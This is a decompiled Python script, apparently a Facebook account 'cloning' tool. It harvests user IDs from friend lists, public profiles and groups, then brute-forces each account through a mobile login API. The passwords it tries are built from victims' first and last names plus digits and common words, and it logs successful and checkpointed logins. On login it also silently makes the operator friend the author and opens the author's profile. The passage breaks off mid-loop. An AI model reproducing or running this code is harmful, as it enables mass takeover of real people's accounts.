# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[00m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = '\x1b[92m\n\n\x1b[1;93m\n   ________  _______                     \x1b[1;93m\n  /        |/       \\                   \x1b[1;93m\n  |$$$$$$$$/ $$$$$$$  |                  \x1b[1;93m\n  |$$ |__    $$ |__$$ |                  \x1b[1;93m\n  |$$    |   $$    $$<                   \x1b[1;93m\n  |$$$$$/    $$$$$$$  |                  \x1b[1;93m\n  |$$ |      $$ |__$$ |                  \x1b[1;93m\n  |$$ |      $$    $$/                   \x1b[1;93m\n  |$$/       $$$$$$$/ \n   \x1b[1;93m\n $$$$$$\\  $$$$$$$\\   $$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$$$$$$\\  \x1b[1;93m\n$$  __$$\\ $$  __$$\\ $$  __$$\\ $$  __$$\\ $$ | $$  |$$  _____|$$  __$$\\ \x1b[1;93m\n$$ /  \\__|$$ |  $$ |$$ /  $$ |$$ /  \\__|$$ |$$  / $$ |      $$ |  $$ |\x1b[1;93m\n$$ |      $$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\\    $$$$$$$  |\x1b[1;93m\n$$ |      $$  __$$< $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$< \x1b[1;93m\n$$ |  $$\\ $$ |  $$ |$$ |  $$ |$$ |  $$\\ $$ |\\$$\\  $$ |      $$ |  $$ |\x1b[1;93m\n\\$$$$$$  |$$ |  $$ |$$ |  $$ |\\$$$$$$  |$$ | \\$$\\ $$$$$$$$\\ $$ |  $$ |\x1b[1;93m\n \\______/ \\__|  \\__|\\__|  \\__| \\______/ \\__|  \\__|\\________|\\__|  \\__| \n\x1b[93m\n|========\x1b[96m======\x1b[93m=======\x1b[96m=======\x1b[93m======\x1b[96m======\x1b[93m=======\x1b[96m=======\x1b[93m|\n\x1b[93m|\x1b[92m   Author \x1b[96m: HUNTERBOY ALAMIN                          |\n\x1b[93m|\x1b[92m   FACEBOOK \x1b[96m: MD ALAMIN KHAN                          |\n\x1b[93m|\x1b[92m Contact\x1b[96m : https://www.facebook.com/alaminkhan.60     |\n\x1b[93m|=======\x1b[96m=======\x1b[93m======\x1b[96m=====\x1b[93m======\x1b[96m=====\x1b[93m======\x1b[96m======\x1b[93m======|'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\x1b[1;91m\r[\xe2\x97\x8f] \x1b[92mPlease Wait Logging in ' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[91m[\xe2\x98\x86] \x1b[93mLOG IN YOUR NEW FACEBOOK ACCOUNT \x1b[91m[\xe2\x98\x86]'
        id = raw_input('\x1b[00m[+] \x1b[92mENTER ID/Email/USERNAME \x1b[00m: \x1b[1;00m')
        pwd = raw_input('\x1b[00m[+] \x1b[93mENTER PASSWORD d \x1b[00m: \x1b[00m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[00m[!] \x1b[1;91mThere is no connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLOG IN SUCCESSFULL'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.facebook.com/alaminkhan.60')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mNO INTERNET CONNECTION'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mACCOUNT IN CHECKPOINT LOG IN WITH NEW ACCOUNT'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword / Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mWRONG TOKEN'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[!] \x1b[1;91mNo connection'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[92mWELCOME\x1b[00m ' + nama + '\x1b[00m'
    print 42 * '\x1b[00m-'
    print '\x1b[1;92m[ 1 ]\x1b[1;93m Start Cloning Indo/Pakistan/Bangladeshi Accounts '
    print '\x1b[1;97m[ 2 ]\x1b[1;93m Start Random Cloning      '
    print '\n\x1b[1;91m0.\x1b[1;91m Logout            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[93m CHOOSE ANY OPTION>>>>>\x1b[92m')
    if unikers == '':
        print '\x1b[00m[!] \x1b[1;91mTrue content'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        super()
    elif unikers == '0':
        os.system('clear')
        jalan('Remove token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[00m[!] \x1b[1;91mTrue content'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[00m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[92m[ 1 ]\x1b[96m Crack from a friend list'
    print '\x1b[92m2.\x1b[00m CRACK FROM PUBLIC ACCOUNTS'
    print '\n\x1b[1;91m0.\x1b[1;91m Back'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;92m CHOOSE ANY OPTION>>>> \x1b[1;97m')
    if peak == '':
        pilih_super()
    elif peak == '1':
        os.system('clear')
        print logo
        jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mEnter The Public ID  \x1b[1;92m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[93m[+] \x1b[92mENTER PUBLIC ID CODE \x1b[1;91m: \x1b[1;92m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mACCOUNT NAME\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[91m[!] \x1b[91mFriends not found!'
                raw_input('\n\x1b[00m[\x1b[92mBACK\x1b[00m]')
                super()

            jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mTake ID Code\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            idg = raw_input('\x1b[00m[+] \x1b[92mEnter ID Group \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[00m[\x1b[92m\xe2\x9c\x93\x1b[00m] \x1b[92mFACEBOOK GROUP NAME \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[00m[!] \x1b[1;91mGroup not found'
                raw_input('\n\x1b[1;96m[\x1b[1;97mBack\x1b[1;96m]')
                super()

            jalan('\x1b[00m[\xe2\x9c\xba] \x1b[92mTake ID CODE\x1b[1;97m...')
            re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for p in s['data']:
                id.append(p['id'])

        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[00m[+] \x1b[92mEnter file names  \x1b[00m: \x1b[00m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[00m[!] \x1b[1;91mFiles are not found'
                raw_input('\n\x1b[00m[ \x1b[91mBack \x1b[00m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[00m[!] \x1b[1;91mTrue Content'
            pilih_super()
        print '\x1b[92m[+] \x1b[00mTotal ID \x1b[00m: \x1b[92m' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[92m[\x1b[1;97m\xe2\x9c\xb8\x1b[92m] \x1b[00mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\x1b[1;92m[!] \x1b[95m For Fast Cloning Use VPN Brazil / US'
    print 42 * '\x1b[00m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass1 + '  \x1b[92m[LOG IN NOW]'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass1 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass2 + '  \x1b[92m[LOG IN NOW]'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass2 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass3 + '  \x1b[92m[LOG IN NOW]'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass3 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['first_name'] + '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        if 'access_token' in q:
                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass4 + '  \x1b[92m[LOG IN NOW]'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass4 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass5 + '  \x1b[92m[LOG IN NOW]'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass5 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '1234'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass6 + '  \x1b[92m[LOG IN NOW]'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass6 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = b['last_name'] + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass7 + '  \x1b[92m[LOG IN NOW]'
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass7 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = b['last_name'] + '123456'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass8 + '  \x1b[92m[LOG IN NOW]'
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass8 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = b['first_name'] + b['last_name']
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass9 + '  \x1b[92m[LOG IN NOW]'
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass9 + ' \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = b['last_name'] + '1234567'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass10 + '  \x1b[92m[LOG IN NOW]'
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass10 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass12 = '786786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass12 + '  \x1b[92m[LOG IN NOW]'
                                                        oks.append(user + pass12)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass12 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                        cekpoint.append(user + pass12)
                                                    else:
                                                        pass13 = b['first_name'] + '786'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass13 + '  \x1b[92m[LOG IN NOW]'
                                                            oks.append(user + pass13)
                                                        elif 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass13 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                            cekpoint.append(user + pass13)
                                                        else:
                                                            pass14 = b['last_name'] + '786'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass14 + '  \x1b[92m[LOG IN NOW]'
                                                                oks.append(user + pass14)
                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass14 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                cekpoint.append(user + pass14)
                                                            else:
                                                                pass15 = 'Bangladesh'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass15 + '  \x1b[92m[LOG IN NOW]'
                                                                    oks.append(user + pass15)
                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass15 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                    cekpoint.append(user + pass15)
                                                                else:
                                                                    pass16 = 'Bangladesh123'
                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass16 + '  \x1b[92m[LOG IN NOW]'
                                                                        oks.append(user + pass16)
                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass16 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                        cekpoint.append(user + pass16)
                                                                    else:
                                                                        pass17 = 'Pakistan'
                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                        q = json.load(data)
                                                                        if 'access_token' in q:
                                                                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass17 + '  \x1b[92m[LOG IN NOW]'
                                                                            oks.append(user + pass17)
                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass17 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                            cekpoint.append(user + pass17)
                                                                        else:
                                                                            pass18 = 'Pakistan123'
                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass18 + '  \x1b[92m[LOG IN NOW]'
                                                                                oks.append(user + pass18)
                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass18 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                cekpoint.append(user + pass18)
                                                                            else:
                                                                                pass19 = b['first_name'] + '12345678'
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass19 + '  \x1b[92m[LOG IN NOW]'
                                                                                    oks.append(user + pass19)
                                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass19 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                    cekpoint.append(user + pass19)
                                                                                else:
                                                                                    pass20 = 'Bangladesh123'
                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass20 + '  \x1b[92m[LOG IN NOW]'
                                                                                        oks.append(user + pass20)
                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass20 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                        cekpoint.append(user + pass20)
                                                                                    else:
                                                                                        pass21 = '000786'
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass21 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass21 + '  \x1b[92m[LOG IN NOW]'
                                                                                            oks.append(user + pass21)
                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass21 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                            cekpoint.append(user + pass21)
                                                                                        else:
                                                                                            pass22 = 'Alamin123'
                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass22 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                            q = json.load(data)
                                                                                            if 'access_token' in q:
                                                                                                print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass22 + '  \x1b[92m[LOG IN NOW]'
                                                                                                oks.append(user + pass22)
                                                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                                                print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass22 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                                cekpoint.append(user + pass22)
                                                                                            else:
                                                                                                pass23 = '1234567'
                                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass23 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                q = json.load(data)
                                                                                                if 'access_token' in q:
                                                                                                    print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass23 + '  \x1b[92m[LOG IN NOW]'
                                                                                                    oks.append(user + pass23)
                                                                                                elif 'www.facebook.com' in q['error_msg']:
